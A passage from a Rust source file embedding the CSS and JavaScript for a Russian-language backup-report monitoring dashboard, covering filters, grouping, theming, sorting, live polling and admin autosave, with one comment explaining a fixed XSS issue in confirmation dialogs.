.toast{position:fixed;bottom:20px;right:20px;padding:10px 18px;border-radius:6px;font-size:.88rem;font-weight:600;box-shadow:0 4px 12px #0003;transform:translateX(140%);transition:transform .3s;z-index:9999;pointer-events:none}
.toast-ok{background:#dcfce7;color:#15803d;border:1px solid #86efac}
.toast-err{background:#fee2e2;color:#dc2626;border:1px solid #fca5a5}
.toast-in{transform:none}
th{background:#f8fafc;color:var(--gray);font-weight:600;padding:6px 8px;text-align:left;border-bottom:1px solid var(--border);font-size:.73rem;white-space:nowrap;overflow:hidden}
td{padding:6px 8px;border-bottom:1px solid #f1f5f9;vertical-align:middle;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.83rem}
.report-table th:last-child,.report-table td.action-cell{position:sticky;right:0;z-index:1;background:#f8fafc;box-shadow:-4px 0 8px -8px #0005}
.report-table td.action-cell{overflow:visible;text-overflow:clip;background:#fff}
tr:hover td.action-cell{background:#f8fafc}
tr:last-child td{border-bottom:none}
tr:hover td{background:#f8fafc}
tr.hidden-row{display:none}
.badge{display:inline-flex;align-items:center;gap:4px;padding:2px 9px;border-radius:10px;font-size:.75rem;font-weight:700;white-space:nowrap}
.badge-ok{background:#dcfce7;color:#15803d}
.badge-error{background:#fef9c3;color:#b45309;cursor:pointer}
.badge-failed{background:#fee2e2;color:#dc2626;cursor:pointer}
.badge-cancelled{background:#e5e7eb;color:#4b5563}
.badge-error:hover,.badge-failed:hover{filter:brightness(.94)}
dialog{display:none;border:none;border-radius:12px;box-shadow:0 20px 60px #0004;padding:0;width:min(680px,92vw);position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);margin:0;max-height:85vh;flex-direction:column}
dialog[open]{display:flex}
dialog::backdrop{background:rgba(0,0,0,.45);backdrop-filter:blur(2px)}
.modal-head{background:var(--navy);color:#fff;padding:15px 20px;display:flex;align-items:center;justify-content:space-between;border-radius:12px 12px 0 0;flex-shrink:0}
.modal-head h3{font-size:1rem;font-weight:600;letter-spacing:.01em}
.modal-close{background:none;border:none;color:#93c5fd;font-size:1.3rem;cursor:pointer;padding:0 4px;line-height:1;transition:.15s}
.modal-close:hover{color:#fff}
.modal-body{padding:18px 20px;overflow-y:auto;flex:1;min-height:0}
.modal-body pre{font-family:'Cascadia Code','Consolas',monospace;font-size:.83rem;white-space:pre-wrap;color:#1e293b;line-height:1.6;background:#f8fafc;border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin:0}
.modal-foot{padding:12px 20px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;flex-shrink:0;background:#f8fafc;border-radius:0 0 12px 12px}
.flash{padding:8px 14px;border-radius:5px;margin-bottom:14px;font-size:.88rem}
.flash-ok{background:#dcfce7;color:#15803d;border:1px solid #86efac}
.flash-err{background:#fee2e2;color:#dc2626;border:1px solid #fca5a5}
.panel{background:#fff;border-radius:8px;box-shadow:0 1px 4px #0001;padding:20px;margin-bottom:18px}
.panel h3{font-size:.95rem;font-weight:600;color:var(--navy);border-bottom:1px solid var(--border);padding-bottom:8px;margin-bottom:14px}
.frow{display:grid;grid-template-columns:200px 1fr;gap:10px;align-items:center;margin-bottom:10px}
.frow label{color:var(--gray);font-size:.86rem}
.frow .fc{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.fi{padding:5px 9px;border:1px solid #ddd;border-radius:4px;font-size:.86rem;font-family:inherit;width:220px}
.fi-sm{width:90px}.fi-lg{width:320px}
input[type=checkbox]{width:15px;height:15px;cursor:pointer;accent-color:var(--blue)}
.hint{color:var(--gray);font-size:.78rem}
.fsec{display:flex;align-items:center;gap:8px;font-size:.9rem;font-weight:600;color:var(--navy);margin:20px 0 12px;padding-bottom:7px;border-bottom:1px solid var(--border)}
.fsec:first-child{margin-top:0}
.fsec-ic{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;font-size:.95rem}
.clearbox{display:inline-flex;align-items:center;gap:6px;cursor:pointer;color:#dc2626;font-size:.82rem}
.cfg-pill{display:inline-flex;align-items:center;gap:4px;padding:2px 9px;border-radius:10px;font-size:.74rem;font-weight:600;white-space:nowrap}
.cfg-on{background:#dcfce7;color:#15803d}
.cfg-off{background:#f1f5f9;color:#64748b}
.fsec-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:22px;padding-top:16px;border-top:1px solid var(--border)}
.btn-wide{justify-content:center;min-width:210px;height:34px;font-size:.86rem;font-weight:600}
.btn-tg{color:#0369a1;border-color:#7dd3fc;background:#f0f9ff}
.btn-tg:hover{background:#e0f2fe}
code{background:#f1f5f9;padding:1px 5px;border-radius:3px;font-size:.8rem}
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
.login-box{background:#fff;border-radius:10px;padding:32px 40px;box-shadow:0 2px 16px #0002;min-width:300px}
.login-box h2{margin-bottom:20px;color:var(--dark);font-size:1.15rem}
.login-box input{width:100%;padding:8px 10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;font-size:.93rem}
.login-box button{width:100%;padding:9px;background:var(--blue);color:#fff;border:none;border-radius:4px;font-size:.95rem;cursor:pointer}
.login-box button:hover{background:#1d4ed8}
.login-err{color:#dc2626;font-size:.85rem;margin-bottom:10px;background:#fee2e2;padding:6px 10px;border-radius:4px}
body.theme-graphite{--dark:#e5eaf0;--navy:#c9d5e2;--gray:#9aa9ba;--border:#3b4654;background:#171c24;color:#e5eaf0;color-scheme:dark}
body.theme-graphite nav{background:#10151c}
body.theme-graphite .theme-select{background:#252e39;color:#e5eaf0;border-color:#566475}
body.theme-graphite .nav-tools{background:#202833;border-color:#3b4654}
body.theme-graphite .nav-version,body.theme-graphite .nav-theme,body.theme-graphite .nav-link{background:#252e39;color:#d5deea;border-color:#566475}
body.theme-graphite .nav-version strong{color:#f1f5f9}
body.theme-graphite .filter-strip{background:#202833;color:#c5d1df;border-color:#3b4654;box-shadow:none}
body.theme-graphite .filter-chip{background:#2a3440;color:#cbd5e1;border-color:#566475}
body.theme-graphite .filter-chip:hover{background:#354253}
body.theme-graphite .filter-chip.active{background:#273d5b;color:#bfdbfe;border-color:#5b87bd}
body.theme-graphite .filter-count{color:#9aa9ba}
body.theme-graphite nav .filter-strip{background:transparent;color:#c5d1df;border:0}
body.theme-graphite nav .filter-chip{background:#252e39;color:#d5deea;border-color:#64748b}
body.theme-graphite nav .filter-chip.active{background:#aac8ed;color:#142236;border-color:#aac8ed}
body.theme-graphite .group{background:#222a34;border-color:#3b4654;box-shadow:0 1px 3px #0003}
body.theme-graphite .group-hdr,body.theme-graphite .group-hdr:hover{background:#252e39;color:#e5eaf0;border-left-color:#6b829e}
body.theme-graphite .group-hdr.gray{background:#222a34;color:#b8c3d1;border-left-color:#566475}
body.theme-graphite .group.has-problems .group-hdr,body.theme-graphite .group.has-problems .group-hdr:hover{background:#3b3025;color:#ffd4a3;border-left-color:#f59e0b}
body.theme-graphite .group-toggle:hover{color:#93c5fd}
body.theme-graphite .group-problems{background:#5b3b20;color:#ffd4a3;border-color:#9a6834}
body.theme-graphite th,body.theme-graphite .report-table th:last-child{background:#2b3541;color:#b4c0ce;border-color:#3b4654}
body.theme-graphite td{border-bottom-color:#35404d}
body.theme-graphite .report-table td.action-cell{background:#222a34}
body.theme-graphite tr:hover td,body.theme-graphite tr:hover td.action-cell{background:#2e3946}
body.theme-graphite .btn{background:#2c3642;color:#e5eaf0;border-color:#526070}
body.theme-graphite .btn:hover{background:#3a4654}
body.theme-graphite .btn-blue{background:#2563eb;color:#fff;border-color:#2563eb}
body.theme-graphite .action-delete-all{color:#fca5a5;border-color:#a3565b}
body.theme-graphite .panel,body.theme-graphite dialog,body.theme-graphite .modal-body{background:#222a34;color:#e5eaf0}
body.theme-graphite .panel h3,body.theme-graphite .fsec,body.theme-graphite .page-title{color:#d8e4f0}
body.theme-graphite .modal-head{background:#303b48}
body.theme-graphite .modal-foot,body.theme-graphite .modal-body pre{background:#1b222b;color:#e5eaf0;border-color:#3b4654}
body.theme-graphite .fi,body.theme-graphite input,body.theme-graphite textarea{background:#1b222b;color:#e5eaf0;border-color:#526070}
body.theme-graphite .atab{color:#9aa9ba}
body.theme-graphite .atab:hover{color:#e5eaf0;background:#293442}
body.theme-graphite .atab.active{color:#93c5fd;border-bottom-color:#60a5fa}
body.theme-graphite .nav-back{background:#2b3541;color:#d8e4f0;border-color:#526070}
body.theme-graphite code{background:#303b48;color:#d8e4f0}
body.theme-graphite .badge-ok{background:#174434;color:#86efac}
body.theme-graphite .badge-error{background:#513c19;color:#fde68a}
body.theme-graphite .badge-failed{background:#54282e;color:#fca5a5}
body.theme-graphite .badge-cancelled{background:#39424d;color:#cbd5e1}
body.theme-graphite td span[style*="color:#1e3a5f"]{color:#93c5fd!important}
body.theme-graphite td span[style*="color:#64748b"]{color:#a8b7c8!important}
body.theme-graphite td span[style*="color:#15803d"],body.theme-graphite td span[style*="color:#16a34a"]{color:#86efac!important}
body.theme-graphite td span[style*="color:#b45309"]{color:#fcd34d!important}
body.theme-graphite #updates-history tr[data-update-status=errors]{background:#38282e!important}
body.theme-graphite #updates-history tr[data-update-status=errors]:hover td{background:#493139}
@media(max-width:700px){.nav-main{padding:9px 12px;gap:8px}.nav-identity{width:100%;border:0;padding:0}.nav-actions{margin-left:0}.nav-version,.nav-theme,.nav-link{padding:0 8px}nav .filter-strip{padding:9px 12px}.filter-meta{margin-left:0;padding-left:0;border:0;width:100%}}
</style><link rel="icon" href="/favicon.ico">"#;

const JS_BLOCK: &str = r#"
<dialog id="err-modal">
 <div class="modal-head"><h3 id="modal-title">Детали</h3><button class="modal-close" id="modal-close-btn">&#x2715;</button></div>
 <div class="modal-body"><pre id="modal-body"></pre></div>
 <div class="modal-foot"><button class="btn btn-blue" id="modal-ok-btn">Закрыть</button></div>
</dialog>
<script>
(function(){
  /* ── modal ── */
  var modal=document.getElementById('err-modal');
  if(modal){
    document.getElementById('modal-close-btn').onclick=function(){modal.close();};
    document.getElementById('modal-ok-btn').onclick=function(){modal.close();};
    modal.addEventListener('click',function(e){if(e.target===modal)modal.close();});
  }
  /* ── подтверждения ──
     Текст берётся из data-confirm через getAttribute и НИКОГДА не попадает в
     JS-контекст. Раньше значение из отчёта агента подставлялось прямо в
     onclick="return confirm('...')": браузер декодирует &#39; обратно в
     апостроф ДО компиляции атрибута как JS, поэтому esc() там не защищал. */
  document.addEventListener('click',function(e){
    var b=e.target.closest('[data-confirm]');
    if(b&&!window.confirm(b.getAttribute('data-confirm'))){e.preventDefault();e.stopPropagation();}
  },true);
  function _formatErrors(errs){
    var maxErrCount=0,textLines=[];
    errs.forEach(function(e){
      try{var j=JSON.parse(e);if(j&&j.error_count>maxErrCount)maxErrCount=j.error_count;}
      catch(_){var t=String(e).trim();if(t)textLines.push(t);}
    });
    var out=[];
    if(maxErrCount>0)out.push('Сбойных файлов: '+maxErrCount);
    if(textLines.length)out=out.concat(textLines);
    return out.length?out.join('\n'):'(нет деталей)';
  }
  document.addEventListener('click',function(e){
    var b=e.target.closest('.badge-click');if(!b||!modal)return;
    var errs=JSON.parse(b.dataset.errors||'[]');
    document.getElementById('modal-title').textContent=b.dataset.title||'Детали';
    document.getElementById('modal-body').textContent=_formatErrors(errs);
    modal.showModal();
  });

  /* ── фильтры отчётов ── */
  var _filterMode='all';
  try{_filterMode=sessionStorage.getItem('rl_report_filter')||'all';}catch(_){}
  if(!['all','problems','errors','stale','oldest','ungrouped'].includes(_filterMode))_filterMode='all';
  function _readServerGroupState(scope){
    return new Set(Array.from(scope.querySelectorAll('.group.collapsed')).map(function(g){return g.dataset.groupKey;}));
  }
  var _collapsedGroups=_readServerGroupState(document),_groupDirty=false,_groupTimer=null,_groupRevision=0,_groupSaveQueue=Promise.resolve();
  function _saveGroupState(){
    _groupDirty=true;
    var revision=++_groupRevision;
    if(_groupTimer)clearTimeout(_groupTimer);
    _groupTimer=setTimeout(function(){
      var body=new URLSearchParams();
      body.set('csrf',document.body.dataset.groupCsrf||'');
      body.set('collapsed',JSON.stringify(Array.from(_collapsedGroups)));
      _groupSaveQueue=_groupSaveQueue.catch(function(){}).then(function(){
        return fetch('/ui/groups/state',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body});
      }).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);if(revision===_groupRevision)_groupDirty=false;})
        .catch(function(){showToast('Не удалось сохранить состояние групп',false);});
    },250);
  }
  function _updateCollapseButton(){
    var button=document.getElementById('toggle-all-groups');if(!button)return;
    var groups=Array.from(document.querySelectorAll('.container .group'));
    button.textContent=groups.length&&groups.every(function(g){return g.classList.contains('collapsed');})?'Развернуть группы':'Свернуть группы';
  }
  function _applyGroupState(){
    if(!document.getElementById('report-filters'))return;
    document.querySelectorAll('.container .group').forEach(function(g){
      var collapsed=_collapsedGroups.has(g.dataset.groupKey);
      g.classList.toggle('collapsed',collapsed);
      var button=g.querySelector('.group-toggle');if(button)button.setAttribute('aria-expanded',collapsed?'false':'true');
    });
    _updateCollapseButton();
  }
  window.toggleGroup=function(button){
    var g=button.closest('.group'),key=g.dataset.groupKey;
    if(g.classList.toggle('collapsed'))_collapsedGroups.add(key);else _collapsedGroups.delete(key);
    button.setAttribute('aria-expanded',g.classList.contains('collapsed')?'false':'true');
    _saveGroupState();_updateCollapseButton();
  };
  window.toggleAllGroups=function(){
    var groups=Array.from(document.querySelectorAll('.container .group'));
    var expand=groups.length&&groups.every(function(g){return g.classList.contains('collapsed');});
    groups.forEach(function(g){if(expand)_collapsedGroups.delete(g.dataset.groupKey);else _collapsedGroups.add(g.dataset.groupKey);});
    _saveGroupState();_applyGroupState();
  };
  function _updateGroupProblems(){
    document.querySelectorAll('.container .group').forEach(function(g){
      var count=0;
      g.querySelectorAll('tr[data-status]').forEach(function(tr){
        var status=tr.dataset.status;
        if(status==='error'||status==='failed'||status==='cancelled'||(_staleH>0&&Number(tr.dataset.stale)<0))count++;
      });
      g.classList.toggle('has-problems',count>0);
      var badge=g.querySelector('.group-problems');
      if(badge){badge.hidden=count===0;badge.textContent='⚠ '+count+' '+(count===1?'проблема':count<5?'проблемы':'проблем');}
    });
  }
  function _applyFilter(){
    var bar=document.getElementById('report-filters');if(!bar)return;
    var rows=Array.from(document.querySelectorAll('.report-table tr[data-status]'));
    var oldest=new Set();
    if(_filterMode==='oldest'){
      rows.slice().sort(function(a,b){
        var ta=Date.parse((a.dataset.ts||'').replace(' ','T'));
        var tb=Date.parse((b.dataset.ts||'').replace(' ','T'));
        return (isNaN(ta)?Infinity:ta)-(isNaN(tb)?Infinity:tb);
      }).slice(0,10).forEach(function(r){oldest.add(r);});
    }
    var shown=0;
    rows.forEach(function(tr){
      var status=tr.dataset.status;
      var error=status==='error'||status==='failed'||status==='cancelled';
      var stale=_staleH>0&&Number(tr.dataset.stale)<0;
      var visible=_filterMode==='all'||
        (_filterMode==='problems'&&(error||stale))||
        (_filterMode==='errors'&&error)||
        (_filterMode==='stale'&&stale)||
        (_filterMode==='oldest'&&oldest.has(tr))||
        (_filterMode==='ungrouped'&&!!tr.closest('.group').querySelector('.group-hdr.gray'));
      tr.classList.toggle('hidden-row',!visible);
      if(visible)shown++;
    });
    document.querySelectorAll('.group').forEach(function(g){
      g.style.display=g.querySelectorAll('tr[data-status]:not(.hidden-row)').length?'':'none';
    });
    bar.querySelectorAll('.filter-chip[data-mode]').forEach(function(b){
      var active=b.dataset.mode===_filterMode;b.classList.toggle('active',active);b.setAttribute('aria-pressed',active?'true':'false');
    });
    var count=document.getElementById('filter-count');if(count)count.textContent='Показано '+shown+' из '+rows.length;
    _updateGroupProblems();
  }
  window.setReportFilter=function(mode){_filterMode=mode;try{sessionStorage.setItem('rl_report_filter',mode);}catch(_){} _applyFilter();};
  /* ── фильтр истории обновлений ── */
  var _updatesMode='errors';
  function _applyUpdatesFilter(){
    var bar=document.getElementById('updates-filters');if(!bar)return;
    var rows=Array.from(document.querySelectorAll('#updates-history tr[data-update-status]'));
    var shown=0;
    rows.forEach(function(row){
      var visible=_updatesMode==='all'||row.dataset.updateStatus===_updatesMode;
      row.classList.toggle('hidden-row',!visible);
      if(visible)shown++;
    });
    var empty=document.getElementById('updates-filter-empty');
    if(empty){
      empty.style.display=shown?'none':'';
      empty.querySelector('td').textContent=rows.length===0?'Нет записей об обновлениях':
        _updatesMode==='errors'?'Ошибок обновления нет':
        _updatesMode==='success'?'Успешных обновлений нет':'Нет записей об обновлениях';
    }
    bar.querySelectorAll('.filter-chip[data-mode]').forEach(function(button){
      var active=button.dataset.mode===_updatesMode;
      button.classList.toggle('active',active);
      button.setAttribute('aria-pressed',active?'true':'false');
    });
    var count=document.getElementById('updates-filter-count');
    if(count)count.textContent='Показано '+shown+' из '+rows.length;
  }
  window.setUpdatesFilter=function(mode){_updatesMode=mode;_applyUpdatesFilter();};
  _applyUpdatesFilter();
  /* ── тема пользователя ── */
  var _themePending=false;
  window.setTheme=function(theme){
    if(theme!=='light'&&theme!=='graphite')return;
    var select=document.getElementById('theme-select');
    var previous=document.body.classList.contains('theme-graphite')?'graphite':'light';
    document.body.classList.toggle('theme-graphite',theme==='graphite');
    _themePending=true;
    var body=new URLSearchParams();
    body.set('csrf',select?select.dataset.csrf:'');body.set('theme',theme);
    fetch('/ui/theme',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body})
      .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);_themePending=false;})
      .catch(function(){
        _themePending=false;
        document.body.classList.toggle('theme-graphite',previous==='graphite');
        if(select)select.value=previous;
        showToast('Не удалось сохранить тему',false);
      });
  };
  /* ── admin tabs ── */
  window.adminTab=function(name){
    document.querySelectorAll('.atab').forEach(function(b){b.classList.toggle('active',b.dataset.tab===name);});
    document.querySelectorAll('.admin-panel').forEach(function(p){p.style.display=p.dataset.tab===name?'block':'none';});
  };
  /* auto-select tab from ?tab= param */
  (function(){
    var m=location.search.match(/[?&]tab=([^&]+)/);
    if(m){var t=decodeURIComponent(m[1]);var b=document.querySelector('.atab[data-tab="'+t+'"]');if(b)b.click();}
  })();
  /* ── sort ── */
  window.sortBy=function(th,type){
    var tbody=th.closest('table').querySelector('tbody');if(!tbody)return;
    var col=th.dataset.col;
    var asc=!th.classList.contains('asc');
    th.parentNode.querySelectorAll('th').forEach(function(x){x.classList.remove('asc','desc');});
    th.classList.add(asc?'asc':'desc');
    var rows=Array.from(tbody.querySelectorAll('tr[data-status]'));
    rows.sort(function(a,b){
      var va=a.dataset[col]||'',vb=b.dataset[col]||'';
      if(type==='num'){va=parseFloat(va)||0;vb=parseFloat(vb)||0;return asc?va-vb:vb-va;}
      return asc?va.localeCompare(vb):vb.localeCompare(va);
    });
    rows.forEach(function(r){tbody.appendChild(r);});
  };

  /* ── toast ── */
  var _toast=null;
  function showToast(msg,ok){
    if(_toast){clearTimeout(_toast._tid);_toast.remove();}
    var t=document.createElement('div');
    t.className='toast '+(ok?'toast-ok':'toast-err');
    t.textContent=msg;document.body.appendChild(t);
    requestAnimationFrame(function(){t.classList.add('toast-in');});
    _toast=t;
    t._tid=setTimeout(function(){t.classList.remove('toast-in');setTimeout(function(){t.remove();if(_toast===t)_toast=null;},400);},2500);
  }
  window._showToast=showToast;

  /* ── live polling ── */
  var _staleH=parseFloat((document.body&&document.body.dataset.staleHours)||'0');
  _applyGroupState();
  function _markPanelUpdated(){
    var el=document.getElementById('panel-updated-at');if(!el)return;
    var now=new Date();
    el.textContent='Обновлено в '+now.toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    el.title=now.toLocaleString('ru-RU');
  }
  _applyFilter();
  _markPanelUpdated();
  var _agentVer=(document.body&&document.body.dataset.agentVer)||'';
  var _relGui='',_relAgent='';
  function _fmtDur(s){s=parseInt(s)||0;if(s<60)return s+'с';var m=Math.floor(s/60),ss=s%60;if(m<60)return m+'м '+String(ss).padStart(2,'0')+'с';var h=Math.floor(m/60),mm=m%60;return h+'ч '+String(mm).padStart(2,'0')+'м';}
  function _fmtBytes(n){var v=parseInt(n)||0,u=['Б','КБ','МБ','ГБ','ТБ'];for(var i=0;i<u.length;i++){if(v<1024)return(v%1<0.05?Math.round(v):v.toFixed(1))+' '+u[i];v/=1024;}return(v%1<0.05?Math.round(v):v.toFixed(1))+' ПБ';}
  function _fmtTs(ts){var s=(ts||'').substring(0,16);var p=s.split(/[T ]/);if(p.length===2){var d=p[0].split('-'),t=p[1].split(':');if(d.length===3){var h=(t[0]||'0').replace(/^0/,'')||'0';return d[2]+'/'+d[1]+'/'+d[0]+' '+h+':'+(t[1]||'00');}}return s;}
  function _fmtStale(ts,sh){if(sh<=0)return '—';var dt=new Date((ts||'').replace(' ','T'));if(isNaN(dt))return '—';var rem=sh*3600-((Date.now()-dt.getTime())/1000);if(rem<=0)return '⚠ просрочен';return Math.floor(rem/3600)+':'+String(Math.floor((rem%3600)/60)).padStart(2,'0');}
  function _esc(x){return String(x==null?'':x).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
  function _mkBadge(st,errs){var ic={success:'✅',error:'⚠️',failed:'❌',cancelled:'⏹'},lb={success:'Ok',error:'Error',failed:'Fatal',cancelled:'Прерван'},cl={success:'badge-ok',error:'badge-error badge-click',failed:'badge-failed badge-click',cancelled:'badge-cancelled'};var i=ic[st]||'●',l=lb[st]||_esc(st),c=cl[st]||'badge-ok';if((st==='error'||st==='failed')&&errs!=='[]'){var ee=errs.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/"/g,'&quot;');return '<span class="badge '+c+'" data-errors="'+ee+'" data-title="'+i+' '+l.replace(/"/g,'&quot;')+'" title="Нажмите для деталей">'+i+' '+l+' &#x2139;</span>';}return '<span class="badge '+c+'">'+i+' '+l+'</span>';}
  function _updRow(row){
    var tr=document.querySelector('tr[data-profile="'+CSS.escape(row.profile)+'"]');
    if(!tr){
      return;
    }
    tr.dataset.status=row.status;
    var tds=tr.querySelectorAll('td');if(tds.length<9)return;
    tds[2].innerHTML=_mkBadge(row.status,row.errors||'[]');
    tds[3].textContent=_fmtTs(row.started_at||row.received_at);
    tds[4].textContent=_fmtDur(row.duration_s);
    tds[5].innerHTML='<span style="color:#1e3a5f">+'+_fmtBytes(row.bytes_added)+'</span>';
    tds[6].innerHTML=parseInt(row.total_bytes_processed)>0?'<span style="color:#64748b">'+_fmtBytes(row.total_bytes_processed)+'</span>':'—';
    var fn=parseInt(row.files_new)||0,fc=parseInt(row.files_changed)||0;
    tds[7].innerHTML=fn&&fc?'<span style="color:#15803d">'+fn+'</span> <span style="color:#b45309;font-size:.85em">+'+fc+'</span>':fn?'<span style="color:#15803d">'+fn+'</span>':fc?'<span style="color:#b45309">'+fc+'</span>':'—';
    var staleTs=row.started_at||row.received_at,sv=_fmtStale(staleTs,_staleH);
    tr.dataset.ts=staleTs;
    tr.dataset.time=String(staleTs).replace(/[-:T .]/g,'');
    var staleDate=new Date(String(staleTs).replace(' ','T'));
    tr.dataset.stale=isNaN(staleDate)?'0':String(Math.round(_staleH*3600-(Date.now()-staleDate.getTime())/1000));
    tds[8].textContent=sv;tds[8].style.color=sv.startsWith('⚠')?'#dc2626':'';tds[8].style.fontWeight=sv.startsWith('⚠')?'600':'';
    if(tds[9]){var lv=(row.launcher_version||'').trim(),av=(row.agent_version||'').trim();var v=lv&&av?lv+'/'+av:(lv||av);var isMini=lv.indexOf('Mini')===0||av.indexOf('Mini')===0;var mm=!isMini&&v&&_relGui&&_relAgent&&_relGui!=='?'&&_relAgent!=='?'&&((lv&&lv!==_relGui)||(av&&av!==_relAgent));tds[9].innerHTML=v?(mm?'<span style="background:#fef08a;color:#854d0e;font-weight:600;font-size:.78rem;padding:1px 6px;border-radius:4px" title="Версия отличается от опубликованной">'+_esc(v)+'</span>':'<span style="color:#64748b;font-size:.78rem">'+_esc(v)+'</span>'):'—';}
  }
  function _applyRelVer(gui,agent){
    if(gui){_relGui=gui;var nl=document.getElementById('nav-launcher-ver');if(nl)nl.textContent=gui;}
    if(agent){_relAgent=agent;var ns=document.getElementById('nav-service-ver');if(ns)ns.textContent=agent;}
  }
  // Сессия истекла/отозвана: /api/latest отвечает редиректом на /login. Раньше
  // ошибка глоталась, и дашборд на настенном мониторе молча застывал на старых
  // данных без единого признака.
  function _sessionBanner(){
    if(document.getElementById('sess-expired'))return;
    var d=document.createElement('div');
    d.id='sess-expired';
    d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;padding:10px;text-align:center;background:#fef08a;color:#854d0e;font-weight:600';
    d.innerHTML='Сессия истекла — данные на странице устарели. <a href="/login" style="color:#854d0e;text-decoration:underline">Войти заново</a>';
    document.body.appendChild(d);
  }
  function _pollLatest(){
    fetch('/api/latest').then(function(r){
      if(r.status===401||r.status===403||r.redirected||r.url.indexOf('/login')>=0){_sessionBanner();return null;}
      return r.json();
    }).then(function(d){
      if(!d)return;
      if(d.stale_hours!==undefined)_staleH=d.stale_hours;
      _applyRelVer(d.released_gui,d.released_agent);
      (d.rows||[]).forEach(_updRow);
      _applyFilter();
      _applyUpdatesFilter();
      _markPanelUpdated();
    }).catch(function(){});
  }
  _pollLatest();
  var _lastServerHtml=null,_lastServerNav=null,_refreshing=false,_refreshAgain=false;
  function _refreshPage(){
    if(_refreshing){_refreshAgain=true;return;}
    _refreshing=true;
    fetch(location.href,{cache:'no-store'}).then(function(r){
      if(r.redirected&&new URL(r.url).pathname==='/login'){_sessionBanner();return null;}
      if(!r.ok)throw new Error('HTTP '+r.status);
      return r.text();
    }).then(function(html){
      if(!html)return;
      var doc=new DOMParser().parseFromString(html,'text/html');
      var next=doc.querySelector('.container');
      var current=document.querySelector('.container');
      if(!next||!current)return;
      if(!_themePending)document.body.classList.toggle('theme-graphite',doc.body.classList.contains('theme-graphite'));
      var nextNav=doc.querySelector('nav'),currentNav=document.querySelector('nav');
      if(nextNav&&currentNav&&_lastServerNav!==nextNav.outerHTML){
        _lastServerNav=nextNav.outerHTML;
        currentNav.outerHTML=nextNav.outerHTML;
      }
      var themeSelect=document.getElementById('theme-select');
      if(themeSelect)themeSelect.value=document.body.classList.contains('theme-graphite')?'graphite':'light';
       _markPanelUpdated();
       if(_lastServerHtml===next.innerHTML){_applyFilter();_applyUpdatesFilter();return;}
      _lastServerHtml=next.innerHTML;
      var tab=document.querySelector('.atab.active');
      var tabName=tab&&tab.dataset.tab;
      var sorts=[];
      current.querySelectorAll('.group').forEach(function(g){
        var th=g.querySelector('th.sortable.asc,th.sortable.desc');
        if(!th)return;
        var title=g.querySelector('.group-hdr h2');
        sorts.push({group:title?title.textContent:'',col:th.dataset.col,
          desc:th.classList.contains('desc'),type:(th.getAttribute('onclick')||'').indexOf("'num'")>=0?'num':'str'});
      });
      var oldInputs=current.querySelectorAll('input,textarea,select'),edits=[];
      function fieldKey(el){
        if(!el||!el.name||el.type==='hidden')return null;
        var form=el.closest('form');
        return (form&&form.getAttribute('action')||'')+'|'+el.name;
      }
      var activeKey=fieldKey(document.activeElement);
      oldInputs.forEach(function(el){
        var key=fieldKey(el);
        if(!key)return;
        var changed=(el.type==='checkbox'||el.type==='radio')
          ?el.checked!==el.defaultChecked:el.value!==el.defaultValue;
        if(changed)edits.push({key:key,value:el.value,checked:el.checked});
      });
      current.innerHTML=next.innerHTML;
      if(!_groupDirty)_collapsedGroups=_readServerGroupState(current);
      _applyGroupState();
      var inputs=current.querySelectorAll('input,textarea,select');
      function findField(key){return Array.from(inputs).find(function(el){return fieldKey(el)===key;});}
      edits.forEach(function(e){var el=findField(e.key);if(el){el.value=e.value;el.checked=e.checked;}});
      var activeField=activeKey&&findField(activeKey);
      if(activeField)activeField.focus();
      if(tabName)window.adminTab(tabName);
      sorts.forEach(function(s){
        Array.from(current.querySelectorAll('.group')).forEach(function(g){
          var title=g.querySelector('.group-hdr h2');
          if((title?title.textContent:'')!==s.group)return;
          var th=Array.from(g.querySelectorAll('th.sortable')).find(function(x){return x.dataset.col===s.col;});
          if(th){window.sortBy(th,s.type);if(s.desc)window.sortBy(th,s.type);}
        });
      });
      _applyFilter();
      _applyUpdatesFilter();
    }).catch(function(e){console.error('Обновление страницы:',e);}).finally(function(){
      _refreshing=false;if(_refreshAgain){_refreshAgain=false;_refreshPage();}
    });
  }
  // Резервная проверка при разрыве SSE, а также обновление относительного
  // времени и статуса устаревших бэкапов.
  setInterval(_pollLatest,15000);
  setInterval(_refreshPage,15000);
  // Реалтайм: сервер шлёт событие на каждый входящий отчёт (/events).
  if(window.EventSource){
    try{
      var _es=new EventSource('/events');
      _es.onopen=_refreshPage;
      _es.onmessage=function(e){
        try{
          var row=JSON.parse(e.data);
          if(row.refresh){_refreshPage();return;}
          _applyRelVer(row.released_gui,row.released_agent);
          _updRow(row);
          _refreshPage();
        }catch(err){}
      };
    }catch(err){}
  }

  /* ── admin autosave ── */
  var _aTimer=null;
  document.addEventListener('change',function(e){
    var form=e.target.closest('#settings-form');
    if(!form||e.target.type==='password')return;
    if(_aTimer)clearTimeout(_aTimer);
    _aTimer=setTimeout(function(){
      fetch('/admin/settings-autosave',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(form))})
        .then(function(r){return r.json();})
        .then(function(){showToast('✅ Автосохранено',true);})
        .catch(function(){showToast('❌ Ошибка сохранения',false);});
    },800);
  });
})();
</script>"#;

const COLGROUP: &str = "<colgroup><col class=c-profile><col class=c-host><col class=c-status><col class=c-time><col class=c-dur><col class=c-added><col class=c-src><col class=c-files><col class=c-snap><col class=c-ver><col class=c-action></colgroup>";
